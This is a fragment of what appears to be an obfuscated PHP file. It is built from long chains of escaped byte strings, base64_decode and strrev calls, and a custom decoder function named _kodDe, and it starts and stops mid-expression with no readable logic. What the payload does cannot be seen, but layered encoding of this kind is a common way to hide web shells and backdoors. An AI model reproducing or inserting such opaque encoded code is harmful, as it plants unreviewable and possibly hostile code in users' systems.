96\xba\xef\x86\x5d\x5f\x78\xfb\xab\x77\x4d\x6e\xfc\x46\x73\x61\xe7\x5d\xc1\xf3\x72\xef\x1e\xf4\xc3\xce\x79\xf7\xf7\x2d\x72\x7e\x3c\x3e\x45\x6\xf4\x9d"."\xc3\x9f\xdf\x72\xf5\x9f\x5e\x5b\x91\x8b\x24\xae\xbb\xef\x37\x6f\x8f\xff\xed\xf8\xed\xc7\xff\xf9\xb9\x2d\x6d\xa7\x7e\xe1\xb1\xf5\xd3\x3f\xee\x5c\xf3\xe7\xef\x5f\xf4\xab\x79\xcb\xa7\xd6\x7e\xf7\xf9\x78\xdb\x39\x17\x56\x2e".base64_decode('Xn/bOfmO/U967/FD5j758F6373Pfft/du+7kJvP919+6btZ3pi/51dKrAwdf3PD9q9b/+3+GVg==')."\25\347\274\135\136\360\307\145\377\230\334\353\331\375\17\370\311\77\63\107\134\141\274\374\231\235\327\377\362\306\366\354\51\13\367\173\363\206\266\137\75\340\134\361\233\3\212\207\16\33\367\354\274\367\322".strrev('ÿèÏÆûŸïüãøøxÂÿ¾ƒuöuëÿ¿Äí‡‡ÿzà×ÿçCaÂ÷İßö»Aÿr\\'."\r".'').strrev('ö»©OƒÎçøŸı²èyì-÷ãÌ‹Ú=_æ:®g;Èó%¿="†•ôÿ?¹÷zš?ëø®›ƒí~').base64_decode('iPPuTJww95yr3jz4ie/NueG1G+97oHTSSfM/b1xx9uJvP/VI/9Jr7ykd+eoLI03PPTnvcwdffA==')."\315\336\267\134\324\26\233\363\217\307\36\77\71\360\325\271\57\67\176\272\265\151\373\323\257\275\271\365\252\251\113\246\36\134\263\245\361\27\367\257\275\161\347\226\257\157\70\376\305\227\266\217\76\367\165".base64_decode('c2XsioNfHt92wlHtXz/yqPvWz3rtpFtP0x794lU/+c93V379h6vK5+8xsXje7T8+58n/uufF+w==').strrev('Øõİçy……‰ŠàoŞŸ[¿§7¹æzınÇïúy¿›¿ÛıË¬ŒÏ›”í{Ìgœï“¥ûÔ]?´då?')."\x7d\x9b\x6f\x58\xb0\x31\xd6\xf5\x97\x83\x6e\x39\xea\x8f\xa7\xbd\xee\x3c\xfe\xde\xa1\x3d\xf\xbd\x7c\xcc\x75\xff\x7e\x7f\xd5\x3e\xf7\x9d\x52\x1a\x31\xce\x58\xbf\xee\xf7\x3f\x3e\xf4\xbf\xbf\xb3\x60\xd9\xb6\x57\x7f\xbe\xf6"."\xdd\xe3\x16\x1c\x12\xff\xdc\xdb\xc6\xfd\x63\x3\x87\xbf\x79\xf9\xf7\x4a\x63\x63\x37\x7f\xe6\xe5\x63\xc6\xd7\xfe\x6e\xd3\xdb\xd7\x15\xbe\x74\xed\xe3\xd9\xef\xbf\x92\x5f\xf7\xc0\xdf\x1f\x5a\xb7\x7a\x9f\xc9\x2d\x7f\x2b\xcd"."\376\163\374\133\337\217\331\17\76\377\333\227\217\173\370\234\215\143\337\273\356\107\17\56\37\175\251\365\334\367\36\370\340\232\237\277\364\323\65\127\45\357\171\346\333\137\270\345\7\277\12\154\277\60\373"."\x9b\x1f\x8c\x4d\x7c\x67\xee\x51\x5b\xe7\x38\xa7\xdc\x93\xb8\xf4\xef\x17\xbf\x70\xe7\x1f\xff\xf9\x74\xf0\xf2\xd4\xef\xa6\x4e\xbe\xf3\xc4\x57\xb6\xee\xd9\x73\xb2\x3d\x71\xef\xbc\xa3\xb6\xef\x71\xe8\x1f\x9f\xfc\xf5\xd6\x6f"."\236\170\316\137\376\317\256\303\157\214\375\363\242\131\172\376\314\333\17\352\15\247\256\337\363\216\344\301\115\327\175\357\276\363\357\73\140\305\27\56\274\367\301\257\356\361\202\261\341\315\227\37\173\340\313".base64_decode('F16z5xcuPlV74cP7Pts367l3znwp/93Gi/a84Ppv3vRY6zmjhzWf3N/TMf2lFxccesVeV306/g==')."\374\71\117\175\151\366\104\356\224\173\177\266\371\311\137\376\356\222\37\135\324\172\331\340\354\157\376\341\175\47\377\344\167\317\333\275\371\340\107\276\363\344\177\356\170\345\336\300\55\315\147\77\125\70\57"."\377\320\201\377\174\372\225\236\137\77\344\216\37\364\303\157\257\75\150\160\303\263\173\54\371\175\303\31\377\325\176\373\211\103\73\77\274\362\314\5\57\224\36\277\352\334\53\157\330\235\160\214\57\56\74"."\xe2\x94\x77\x97\x7c\xe9\xb0\xd9\x7b\xec\xb5\xf0\x1f\x85\x55\x3f\xfa\x3f\x8f\x2d\xfd\xcf\xc6\x63\x4f\x1d\xb9\x6d\xf1\x82\x5f\x9f\x7f\xc0\xc8\xde\xef\x2d\xf9\xdc\x77\x73\x5f\xfe\xed\xed\x4b\xaf\x9b\x77\xd2\x2d\x7b\x9f\xbc".strrev('øüù.w½Eåê|;ŸŠÃ•ùœ‰÷Wà¡ûÿz_«7ô?šlÏn›íÆÔı5‘¤vwo{4¾k÷W†ç')."\370\117\257\235\165\365\345\147\35\77\372\333\372\35\53\257\356\277\75\324\363\300\241\323\355\17\25\176\376\114\107\127\307\73\307\66\274\365\146\337\237\157\371\371\55\123\227\34\104\266\356\323\316\170\373"."\310\312\76\367\56\372\355\140\303\374\153\66\36\365\257\137\177\57\176\300\7\57\135\276\367\273\366\231\137\173\376\335\157\177\166\303\305\156\242\147\277\343\326\234\336\267\156\307\27\117\160\306\373\266\355"."\367\156\274\121\73\61\372\247\163\166\275\367\235\26\173\160\333\222\147\367\275\377\267\337\112\106\177\162\371\223\103\227\355\72\152\337\233\172\126\134\26\62\133\37\330\366\316\77\316\335\245\17\176\360\336".base64_decode('ud8Nf23yw3eW7Pro/Z+/X3/98Se++8GrB3z0wVtTI7t+8ej+az567vv/ccVH/1r8wT/+cn1Ifw==')."\xf4\x81\xf\xde\xbc\xe9\xbf\xf5\x8f\xde\xfa\xe0\x37\x17\x86\x1f\x7d\xff\xa5\xe7\x1e\x5d\xf5\xd1\xdb\xbf\xd5\xff\x3a\x7c\xf4\xdf\xf6\x38\xfc\xce\x39\xb7\xed\x73\xf2\xb2\x91\xc1\x6f\x26\x9e\x38\x6e\xeb\x9f\x3f\xdc\x3e\xfe"."\376\357\37\74\374\263\327\333\175\337\271\347\137\357\365\144\306\357\270\377\225\115\343\17\264\156\377\132\151\342\157\177\375\325\374\103\16\231\163\367\31\107\376\317\323\207\54\273\162\347\101\277\270\365\361"."\67\334\305\253\176\172\307\355\7\237\63\372\347\103\277\161\313\233\377\76\174\277\65\77\34\174\347\302\277\376\361\220\266\165\177\330\160\342\201\107\144\136\36\172\374\233\313\347\76\162\332\234\275\372\237"."\x7a\xea\x91\x3f\xfe\xdc\xbc\xee\xb4\xa5\x3b\xfe\x3e\x67\xff\x1f\x7d\xb4\xd7\x59\x66\xe0\x85\xf5\x5f\x46\x33\xc1\x72\xc9\xda\x6c\xe3\x5\x37\xc8\xf9\x16\x36\xc1\x5\xf6\x92\x25\xa0\x27\x55\xde\x92\x9f\x10\x9a\xa3\xcb\x16".base64_decode('Ab+1cBFYQS1YAPlyY6VJYwJ0mCFuMeZaBsXy5vDEUA5Ef4ubUUCeKQ9tmUDlFXOsUN4Mhykong==')."\x1b\x1a\xdf\x54\x2e\x81\x50\x67\xc9\x52\xe8\xe2\xb2\x65\x50\xbe\xb9\x79\x19\x1c\x76\x47\xdc\x2d\xa5\xcd\x70\x64\xdd\x54\xc8\xd9\x93\x78\xeb\xc\x39\xe7\x2f\x5a\x86\xfd\x87\x1e\x2d\x5d\xa\x49\x25\x2\x8b\xbc\xb5\x5\xba"."\206\35\136\272\0\0\263\170\61\50\325\55\156\132\204\43\137\2\147\262\312\150\316\51\203\354\172\301\62\350\163\246\124\54\214\16\3\227\72\37\253\311\16\225\55\247\10\312\7\13\26\56\303\252\240".base64_decode('UDOOzRjPjW1GCcDk0OimiTKcrSYtZ9QoozLB5snhjA3wbF4IhSeHc+NZNKSwjYw5Mgn3o5N2sQ==')."\x34\x3a\x4\x90\x5e\x32\x1f\x14\x81\xdd\xe2\xd0\xe8\x38\xaa\xc3\x95\xac\x5c\x66\x7c\x4\xf2\xdb\x43\xf9\xf2\xe6\xc\x48\x9f\x96\x60\x2f\xc7\x37\x8f\x4d\x18\x65\x94\x17\x96\x73\x9b\xb\x93\x30\xfa\xe1\xca\xe6\x6c\x39\x3f".strrev('ñÙKÚï»¦:Œ%ó&²oÀl†[Ãc.€M­2P¹xÂâ	`Báã’ò¹¢¥ØŒ!H@ ‰').base64_decode('yc15xDmYukXzofmliB7LcOryRnnT8DiAbTKX35LdDHhStIfdzBYYffP8xYhK5cmSDWBYvBBGsw==')."\x78\x9\xe2\x1f\xaa\x14\x4e\xe\x6f\x19\x19\x87\x4e\xd\x95\x2b\xe6\xf0\xd8\x16\x4\x1d\x64\x1d\xdd\x34\x69\x5b\x68\x0\xb8\x70\x9\x60\xd0\xfc\xe6\x26\x44\x4\xc8\xb7\x6c\x9\x34\xbd\xa0\x9\x5a\x33\x27\xdd\x7c\x29\xb".base64_decode('fciPGKMT7iQuCMiyqAkGumghlK6Qk98wwnjZUmhlIeLdRGFLuTQMHV6MK3lzJbfFskewj1gG+w==')."\xba\xc\x1b\x41\x35\xd3\x25\x4b\x20\xa6\x62\xe6\xb7\x8c\x58\x43\x48\x2a\x70\x99\xe2\xca\x59\xa\x13\x33\x3a\x51\x2c\x6f\x46\x22\xb0\xc\x61\xbc\xa0\x19\x97\x1c\xa2\x4d\x33\xf6\x97\x5e\x65\x4c\xe2\x6d\xc3\xb8\x9b\x31\xb2"."\133\154\154\144\31\326\335\214\104\5\73\263\271\340\156\31\107\223\330\315\205\61\173\34\16\345\371\115\103\225\242\205\172\303\233\163\133\52\171\200\220\125\312\224\13\110\353\226\10\242\145\147\207\113\71"."\30\126\166\74\127\266\12\20\50\130\303\43\271\55\60\15\231\134\241\342\216\302\252\330\222\313\217\131\270\104\332\214\314\50\212\223\205\202\266\252\367\134\66\235\112\336\345\302\67\365\212\7\115\106\255"."\142\250\140\24\205\316\121\27\214\112\215\343\125\0\200\115\23\115\22\240\243\256\324\144\1\365\153\210\267\12\246\24\227\363\73\20\54\51\17\361\124\202\242\350\302\320\140\112\255\45\123\164\225\144\22"."\362\244\246\124\253\11\30\51\355\141\110\205\300\6\350\102\160\376\174\255\140\27\335\34\304\243\316\172\215\113\127\220\376\252\67\152\243\166\66\223\267\53\131\117\133\331\241\120\15\130\363\361\325\112\31".base64_decode('9scLjaohZR5l5R4jAYzzwJWXg/uc1aarZYe45biDOlg8SWd/YHjcitqhGvzCQhCv7kDZ21GrDw==')."\xe1\x5c\xf3\xcb\x3\xd7\x70\x46\x43\x6a\x87\x83\x6a\xaa\x55\x24\x3\xcc\xe7\x43\x5e\xb\x7b\x6a\xea\xde\xd7\xab\xa7\x23\xa9\x35\x8a\x1e\x25\x35\xc5\xf6\x34\x5f\x35\x58\x39\xf7\xa\xc8\x55\x14\xf0\x2\x6\x51\x6c\xf7\x1d"."\xf\x4e\x5d\x78\xf9\xf4\x65\x77\x4e\x9f\xbf\x63\xea\x81\x4b\x76\xef\xb8\x73\xea\xe1\xcb\x48\xf0\xf5\x9d\x17\x4c\xed\xb8\xee\x8d\xab\x4e\x7f\x7d\xe7\xf9\xaf\xef\x3c\x69\xf7\x99\x77\xbf\xfd\xd0\x79\x53\x17\xde\xb1\xfb\xd4"."\207\247\256\271\155\352\346\63\137\177\360\341\335\217\236\271\353\266\163\137\337\271\175\372\232\263\247\116\277\367\365\7\57\237\72\353\206\251\63\57\234\276\344\374\327\37\276\206\344\237\76\113\326\114\262"."\x4d\x6d\xbf\x92\x96\x7d\xe8\x94\xa9\x9d\x3b\x77\xdf\x78\x9b\x48\x7d\xfb\xa1\x93\x71\xc1\xca\xe9\x49\x1d\x1b\xc7\x89\x61\x78\xad\xad\xd4\x0\xa3\x4d\x27\xa4\xf5\xe6\x4d\x2\x31\x2d\x43\x8d\xd4\xa8\x26\x9d\x9b\x33\xcb\x9a".base64_decode('yzTqDPKvaBeDHDdxjq0iTdYQ1iGBv2mzUKJYCFAKc5tiaY/SzoSW2pAxqvGrAd6rEF4aT4qZwQ==')."\136\263\26\231\105\53\240\26\64\106\323\170\254\360\11\21\300\21\120\101\277\126\62\313\5\313\241\172\330\232\75\114\115\255\64\172\55\201\210\351\135\63\265\346\233\47\324\300\172\72\351\22\151\32\350"."\x67\xa3\xb7\x4f\x1a\x95\x73\x6a\xc3\x6\xf9\xcc\xb6\x68\xc3\xa4\x3c\x5e\xf0\xc\x6a\xae\x8d\xdf\xbe\x65\x5b\x13\xbb\x44\x27\x10\xc3\x46\xc4\x1d\x83\x14\x7d\x43\xb7\x14\x7b\x27\x7e\xbf\x54\x85\xd9\x8c\xe\x78\x49\x9b\x87".base64_decode('QniJoprkhQPIppl+R0DjXQkw8AY0r2k+1ddAHQg6FjlZIY2ng/IQL95SPbiyWcqLi7Z2uzTJIQ==').base64_decode('DMiswtY3yFQNgIphehIJ4ai4NTKqcFel4pbdnidEWl4HM90L2WUelNJ405HWAGUza6HiuVlgOQ==')."\201\266\207\224\273\260\345\124\336\216\326\207\126\11\276\312\225\42\355\22\220\123\156\10\47\64\344\63\144\15\227\75\127\201\53\126\225\162\45\12\154\167\371\52\260\71\101\143\111\245\237\360\55\155\376"."\xd4\xd8\xbc\xff\x7a\x51\xac\xf8\x8e\x36\xc5\x67\x9\xcd\xd6\x12\xc\x6\x15\x31\xb8\x54\x1b\xa4\x5f\x3a\xe\x9e\x19\x6f\xa5\x72\x15\x97\x2a\xc9\xac\xce\xdb\x43\x88\x6c\xf2\xee\x9e\x64\x8f\xd2\xc9\x9d\x29\xbe\x43\x28\xd5"."\x10\x12\x36\x32\x42\xea\x6b\x61\x46\xd6\xda\x3c\x8d\x8c\x61\x69\x68\x3e\xf9\x60\x74\x64\x51\x68\x9\xf9\x64\x0\x7\x9a\x31\x0\x93\x40\xa0\xb\x20\x9d\x1d\x5a\x8\xe7\x3b\x67\x39\x6a\x88\x32\xd4\x6a\x55\x46\x26\xe7\x4"."\x62\x2b\xc5\x3c\xc6\x92\x4f\x92\x25\xc9\x67\xa6\xc5\xb\xe\xb3\x98\x55\xa\x2d\x37\x32\xae\x52\xab\x3e\xc\xf0\xe\x49\x50\x19\xf3\x64\xba\x99\x5\x5b\xd1\xb0\x2\xc0\x71\xc8\x80\x65\x75\x63\x18\xc\xdc\x63\x45\x7f\x8c"."\134\204\372\210\351\372\66\330\266\110\52\326\256\367\106\320\252\306\50\225\302\116\166\324\11\123\65\124\153\314\214\133\103\141\352\62\202\316\167\110\70\125\140\344\125\67\206\354\262\213\130\133\241\56\7"."\x46\xd5\xb6\xf9\x77\xb7\x17\xb9\xc9\xcc\x4\x5\xbe\x13\x9c\x24\x5d\xc9\x72\xca\xd\xfb\x36\xc\xd6\x51\x1c\x60\x24\xe5\x52\xa1\xc5\xd9\x44\x7e\x4c\x51\x57\xc5\xd3\x12\x19\x6e\x51\x28\x68\x3b\x79\x3\xef\x96\x1d\x6a\xfc".base64_decode('VDTFoqk44vqLGjPohNlC3oEsMD1rQWI81qZ3xECJNtIb01OphAI/MOZak+jQ2xOJNTFYGC3Khg==')."\106\315\170\245\116\1\15\111\163\136\272\334\125\125\106\225\3\244\76\140\50\353\222\322\100\345\227\54\275\366\256\110\122\230\171\54\12\65\205\346\313\274\244\101\235\332\264\264\242\7\212\124\72\222\254"."\341\11\210\173\10\2\120\203\127\40\50\320\225\130\247\265\47\342\175\335\75\51\356\0\207\307\367\44\224\164\246\314\17\311\350\47\250\72\31\252\217\366\306\43\355\121\55\326\223\116\240\272\266\320\150".base64_decode('ZmZZKRFGEJQdqSAO5XlANR1TaxQ1QWfk/Sj0S2uFHNCUlujROvp647H2SDqqrYlu0Lj1GVQQ7g==').strrev('ë±ş1í>ë!c=¤d‰Ÿà7„Sºr°:Êø‹O€Şó©b'."\n".'ÃpÜhhÌ'."\r".'ÔÔ')."\322\273\136\177\340\202\135\337\330\61\165\366\371\244\242\351\253\117\231\276\342\136\302\67\122\136\161\307\171\273\36\271\140\372\322\73\246\317\3\36\117\333\175\307\175\257\77\374\350\256\113\157\233\332\161"."\345\364\345\367\357\272\372\64\236\360\306\267\357\232\72\347\66\321\61\355\215\113\36\231\276\340\26\301\77\162\266\61\100\112\277\161\372\371\273\36\336\101\271\307\233\116\232\276\347\334\351\153\316\237\72".strrev('š¦#Eùõ¨~HÓs£Ìà3óà•z>LğKœ~áäL~ÙqßwóŒêu<ßSÁuÛn«©Æç').base64_decode('fmxftKc96je+U4PghWkuRzGuMgVHBwe8OGGYuXdprZ+xF9sAgZROKZ3piKbak7G2KNiniImazQ==').base64_decode('WE/QeiGxqeRa8S1stau8ZmkNuBoaNc9AjFDGzlcKRdZZrY6qCNYFKH1lloBaHeUfSIRJfVE0UA==')._kodDe('KDHduUJ0snM5H5a1JvlHUI36ssgu4MhGtoo3KukOCHro/dwQkLCrXsjqE7hB6ovdVBMv/sM2Kn0=')."\325\356\312\274\204\260\72\156\331\260\310\126\242\145\2\42\112\224\47\277\36\347\130\231\220\54\301\347\211\344\360\307\151\221\236\16\157\116\356\123\253\267\236\251\373\146\102\256\360\342\203\323\134\337\250".base64_decode('DYHVT41EVswDjFYPMBrmAaHpXS3mm5v0aNzAk3fLcHCiIJZNFY3ls4V5bTIMMjk8P/kQKdTkRQ==').strrev('lĞìóAJyc‹½ºhÕSQ¥\\&¡eÄ1÷DÅÁ+H#8,ãåÏœugg1¤kbñ¤ÀH™èDÔ')."\17\242\112\160\152\36\24\21\247\72\310\307\227\13\45\10\263\130\276\130\17\265\143\346\226\231\251\366\256\150\167\44\4\273\0\307\4\236\237\162\215\204\22\327\123\312\307\243\352\75\340\147\15\41\310".base64_decode('0qxVsq50l/B5HAqlEegMzL7GfGUYrEhrPfduBFUKn36JZFonAADyrFDdemW7UawRqOnhGLKmww==')."\x84\x71\xb3\xd1\x4f\x53\x76\x8\x5d\xff\x91\xca\x69\x9d\xed\x89\x9e\xce\x18\x1a\xa1\x76\x80\xc0\xa2\x94\xb5\x3d\x99\x3a\x92\x31\xea\xbc\x6\xda\xd7\xb0\x2a\xc5\x6\x98\x4\xa4\x8e\xd\x9\x94\x50\xe8\x4a\xbe\xa5\x3\x10".strrev('\'\\˜"SºFI%IO³a.ïˆu×}J ÃB—Ğ$í²[â=SöÒ|Ræ†Íˆ	<˜ š')."\x44\x1c\x37\x38\xd2\x7b\xfa\xba\x25\xc5\x8f\x47\xd6\x12\x64\x49\x48\xe\x7\xa9\x75\x43\x68\xee\xaa\xc6\x1\x6e\x41\xca\x3f\xf9\xcf\xd1\x18\xa2\x56\x75\x83\x5b\xe7\x7\xb4\xc5\x27\x34\x42\x1e\xe1\xf5\xc5\xcd\x11\xee\x53"."\227\255\34\33\327\343\211\325\74\314\174\47\106\213\131\171\22\323\372\65\302\251\247\45\247\356\340\326\45\126\203\106\160\30\371\200\236\304\272\210\164\307\247\44\100\214\364\316\27\76\276\177\140\174\40"."\x44\x98\x5\x67\xa3\xb4\x8\xed\x68\xd3\x90\x8f\x61\xfe\x7f\xe0\xd0\xa\xa5\x23\x82\x53\x9\xc0\x8e\xa1\xe7\xed\x11\xf4\xcc\x45\x8\x22\xb2\xb\xfc\x77\x3d\x7e\x30\x5a\x9\x5\x32\xcc\xc3\xc0\x84\xe8\x44\x24\x78\x9c\x3e".strrev('»ŒÉŠ¶Wƒ€®G8€¬-WÇ‡QL€PuõˆlyJ›Éë£Ò]2ó)pÍÄ0@Î`m°').base64_decode('rYf8W53eFiX/4uQnnibTZYkMZEnGY2ui2+h/MqFRAJLbu3kLxHq2kf8JgdkW6/FX1hZNr4tGeQ==')."\6\374\206\137\231\225\20\34\30\252\342\133\223\232\242\100\262\64\115\201\252\165\275\201\1\63\70\70\257\121\327\303\116\37\340\213\360\135\323\120\177\324\374\172\330\103\42\251\166\111\175\75\10\121\215"."\xb\xcc\x70\xc4\x8b\x8\xc2\x63\x24\x84\x57\x27\x13\x7d\xbd\x4a\xb8\x2b\xb2\x36\xd6\xb3\x1a\x43\x61\x34\xb0\xd0\xe6\x42\xd5\x5a\x47\x2c\x45\x40\xd4\x8e\xc8\x28\x1d\x59\xaa\x61\x60\x38\x19\x5b\xa4\xb2\xcd\x1e\x94\xee\x20"."\x94\x9d\x4\x14\x9e\x9f\x9e\x26\x38\x65\xf6\xae\xb2\xb6\xbe\x58\xbc\x43\xf5\x92\x40\x33\xc2\x86\xc2\xa8\x3a\xec\x29\xb3\xb1\x73\x18\x66\xfe\x12\x30\x40\x41\x8e\xdf\xc\xdd\x30\xc0\x60\x80\x1\xe\x0\xc\x31\x70\x61\x80"."\x39\xcc\xc4\x0\x1b\x28\x6\xe8\xf1\x26\xda\x83\x69\xe4\xe8\x48\x8e\x7d\x78\x1e\xcc\x19\x63\xc2\xee\x77\x79\x76\x48\x71\x6c\xe3\x93\x25\x33\xf9\x9b\x22\x8d\xe0\x67\xa\x4d\x71\x24\x40\x85\xd2\x8a\xcc\x2c\xcc\x73\x10\x6"."\223\345\41\277\3\33\127\61\6\170\43\342\42\67\153\167\323\226\53\234\21\160\37\115\334\0\225\64\32\143\66\307\112\263\170\135\310\144\260\272\255\134\31\260\275\131\215\220\342\66\176\277\0\2\163"."\x29\xab\xa2\xaa\xa7\x4c\x94\xce\x83\xde\x63\x97\x20\x45\x1b\xc5\x69\xa\xec\x65\x3\xf0\x8b\x3b\x54\xd9\x2e\x81\x68\xd6\x1a\x6\x8f\xbc\x28\x3f\xe1\x3f\x9f\xe3\x3f\x3\x50\x0\x45\x2f\x3\xd0\x8d\xfa\x0\x6c\xbd\x3\xc8".strrev('WúLÊv%”±°C°@d8fên`çYcä%‰ÎˆÒ‹ü¯ò6¿ÉKÉ54L÷¶')."\322\335\2\336\146\260\43\235\274\41\340\267\26\62\334\221\114\364\162\276\105\213\165\152\334\335\210\126\317\357\71\352\141\354\355\311\50\135\123\74\27\246\65\324\173\4\162\53\353\65\160\106\320\350\55"."\25\353\351\210\256\327\352\255\354\204\156\30\72\24\246\147\125\254\110\253\252\11\153\340\175\205\253\123\20\265\247\45\256\126\361\155\314\77\10\132\165\7\340\310\57\122\70\273\314\223\142\51\262\233\307"."\343\154\100\44\311\162\50\227\33\320\204\367\16\32\111\117\46\134\22\14\25\141\2\257\210\47\105\327\247\223\21\32\311\130\323\175\147\221\77\214\332\320\243\123\271\140\160\263\143\306\320\205\66\202\10"."\x62\xa3\x87\x7f\xe4\x9c\x25\xe5\x20\xf9\xa0\xd6\x0\x87\xcd\x43\xbd\xc9\x58\x77\x24\xb9\x1\x20\x20\xf9\x7d\x58\x7a\x76\xde\x63\xbf\x2e\x3\x96\xd3\xa7\xf8\x52\xe8\x21\x9d\x50\x7d\x2b\x10\xc2\x42\xce\xab\x90\x93\xcc\xb"."\x30\x31\xdc\x67\xb1\x2e\xc\xe1\x1b\xd0\xa8\x3b\x80\x1f\xb0\xac\x66\x3b\x1a\xff\x5b\x37\xdb\xa9\x53\x7e\x3d\x13\x8f\x4\x9a\xcc\x3e\xec\xfc\xb0\x3b\xb9\xcc\xe8\xe\x45\x59\x5\x42\x98\x44\x68\x8c\x8a\xeb\xc\x58\x62\xd2".base64_decode('Ol3G5e3iiIyn7gukjzn6RehcAS9WzQwZj5D949dQ3h4SpQ1FyC0mFSEo/TzTvZiiC24qnZG+uA==').strrev('4½<ÌÆñÃN|z	)Lóıˆßªj¦K®%Ñg@ó–	jôƒC$¡@¿±8€Tk3Ë1#')._kodDe('KYgpZ+g9mhFyDZZVCCXJHrTRxRYdViHyOY2zxjtmKOgCMhDKqLHFBl09uTmFx++S/ojhHb6q0nU=').strrev('£[DXCƒ	á<{bG.†—i>¤) è6a'."\0".'wÔ­¢zÇV{E¨Ö +bdp@('."\n".'6vÏ')."\166\366\350\41\33\100\72\144\214\206\244\145\133\54\241\307\11\117\257\253\362\303\130\2\244\352\36\37\251\334\206\200\177\353\272\364\47\24\62\244\235\201\133\256\50\326\177\226\315\164\372\273\105\61\146".base64_decode('hEBwIyI9jIhbAJZWGaKl1W0ZyvvcElt2C02hmTnHtVxm1z2N+5X41WhpXyC1ClCJQbirhAJ9ig==')."\207\20\166\335\205\15\262\373\270\242\277\173\324\217\100\67\172\157\42\174\101\36\335\333\351\246\34\34\131\244\216\120\66\110\347\114\315\51\21\54\244\156\161\65\360\336\250\145\155\365\32\24\246\205\35"."\1\361\323\315\111\327\52\252\77\351\216\66\230\52\257\231\175\201\332\136\246\314\74\334\215\164\14\61\63\17\151\6\52\55\345\244\371\7\367\212\351\313\10\45\143\2\120\112\256\232\221\212\321\150\134"."\172\225\246\127\116\22\143\6\121\272\41\201\264\305\302\355\333\177\343\54\272\132\264\173\305\215\360\72\171\325\6\54\35\251\300\173\25\55\312\251\123\101\257\165\253\162\122\277\62\37\67\317\350\236\215"."\365\114\61\6\246\127\345\212\171\123\245\110\152\16\252\6\163\4\251\130\244\142\242\203\336\104\171\150\11\350\142\271\142\13\30\201\30\374\55\143\112\110\72\237\142\165\122\206\60\50\135\300\144\15\325"."\162\132\171\146\341\10\25\147\330\154\113\244\37\266\124\177\60\41\351\215\133\254\243\243\305\354\120\207\3\101\304\65\202\130\272\322\227\136\221\137\372\341\345\320\120\140\317\42\370\47\133\371\132\213\354"."\104\227\105\127\302\244\202\60\112\254\130\140\340\13\74\216\172\140\324\306\310\164\301\125\236\207\210\305\22\120\66\144\122\203\75\156\76\25\25\276\123\111\101\356\341\360\223\13\365\51\356\320\147\240\65".base64_decode('Ncu1Q0bRYJnJxD65waQp2R1SjNlHfmIhSXtZS6yQQq99ZRg6JhU6H8pBssQxsmH0JPQuwhwnkA==')."\x1b\xb3\x9c\xb4\x87\xee\x63\x29\xd8\xd6\x5d\xc2\xfb\x65\xc2\xcc\x16\x1e\xf6\xa3\xe5\xec\xba\x91\x5f\x2a\xc3\x64\x6f\x25\x24\x5d\x7c\xa1\x5e\x11\x78\xdb\x93\xac\x48\x84\xff\x6c\x28\x64\x83\xa4\xe3\x41\xdc\xba\x5d\xe1\xf6"."\x8c\x59\xfe\x2a\x4e\xd9\x14\x4f\x2\x5\x41\x6a\xc7\x15\x87\xc7\xc6\x98\x49\xcd\x21\x51\x6a\x54\xa5\xb9\x5\x43\xa9\x1e\x1c\x74\x91\xde\xb\xa6\x12\x7d\x49\xbc\xc3\xa2\x61\x2a\x7a\xd3\x93\xd1\xf6\xd\xe2\x36\x48\xc4\x76".strrev('[Î?·héc#Â)[¤¾&jk=cÇ§Û;á.©¾ãF|•Éë9;<hôZ3]YtTbcúÖF')."\3\217\113\364\11\317\103\54\62\32\111\242\267\167\32\156\213\47\332\225\62\261\104\65\170\4\67\44\42\271\60\225\107\206\217\157\30\330\312\116\166\55\344\200\227\335\106\245\56\301\201\220\76\70\257"."\x71\xd5\xc0\x9\x8d\xd\x3\xe1\x55\xa1\xb9\x42\x5c\xc8\xa9\x98\x62\x65\x3e\x43\xb4\x83\xdb\x53\x8b\x3f\x82\xee\x6c\x55\x91\x64\xcf\xc2\x38\x5e\x15\x84\xc2\xa1\x10\x34\x2c\x3e\xc2\x3\x61\x74\xc3\x17\x96\x89\xf0\x2b\xf3"."\37\351\333\203\340\315\205\24\367\151\346\351\274\317\371\16\172\265\10\371\315\33\165\264\151\104\42\154\14\243\226\107\214\337\144\353\251\15\51\61\255\336\70\17\362\162\364\127\25\142\174\231\311\277\136".base64_decode('NStVCquZ0YP9Hot/NSpk2XJhSQqQtTMV6kVNzpv0D0CiQmoV6lq1bGA30FybOTAAKkHlKfDpdw==')."\230\40\167\156\36\354\360\364\221\154\56\243\122\310\2\255\246\220\222\24\311\276\15\334\100\73\341\314\127\167\305\216\131\23\357\356\111\364\36\233\114\245\373\326\256\133\277\1\174\360\266\40\246\16\153".strrev('ÇÉ6[ÑÈgóº(\\-¯v¸Y)J‘ ’äNz9Ôˆ‘ã•a:b¼ôµAğÇ„>90ëS)A').base64_decode('nSF1bffHVwyJ/QPOoFgGWXMMB22CBrXU33TkBQdwPkH1hRG6LlR2NjvkY1EgQuqoKIyMjBSO6Q==')."\171\160\322\224\152\262\366\270\342\330\35\227\47\51\16\74\35\70\232\136\115\375\52\243\37\345\315\314\55\256\337\247\356\346\240\61\352\111\227\7\361\315\301\121\163\322\23\366\371\325\235\303\266\245\156".base64_decode('e6TcHHZpP4tkK4O+AHOjLke2vQm9MLqJdvmIgYgU3nBSTDu4RVsIL3Z0khNAVuvnxwK4JKFcIQ==').base64_decode('e3SCBwOadIaP4m2vl3tcj3RVKYbiGdVRCdL8wqhUHiqMCr2bjIcRojyHDJUVXodjBU1rm8SlCQ==')."\346\327\155\223\111\345\35\60\217\223\30\365\175\41\364\204\343\313\206\256\154\370\71\200\215\2\217\231\237\234\123\172\226\241\163\42\217\105\302\241\217\154\132\236\266\230\157\175\30\275\121\114\12\113\45"."\x12\x50\xce\x2d\x4e\xe\xf\xc7\x63\xc2\x7\x8f\x74\xef\xaf\x9c\xcb\x4c\xe9\x73\xa2\x2c\x5c\x9d\x30\xdf\xf5\xf2\xe1\x22\xc1\x6\x3\xbe\x11\x5e\x69\x4\x24\xe2\x73\x70\xe1\xb5\x2\xca\xcf\x61\x57\xf3\xc\x23\xe7\x28\xaf".base64_decode('J9DZU7ndcXMoa4zxGFSizOQqxVGpm8aCjvKtIKciaEJcVYKdnr2Mz327t/KC4Wa8zp6SZsk0Zg==').base64_decode('nDSXyuMVkCiAJjmk5whKm+Shh4akQuJy/9mR65vSCoTfCTcn9WjxYTDRVov3ICklDtzvk/xWjg==').base64_decode('yaz6NHM1ARucgydpJUO7zxUei+z2+Y1gkb2eLgoPNNKXGVMwJNgnfT9J/xYhg2xVhjguo68LTw==').base64_decode('NHom4yH2vAG8xAOotBo12+DNDlgW4hYcz4HKsxzOKF7glEC0r6P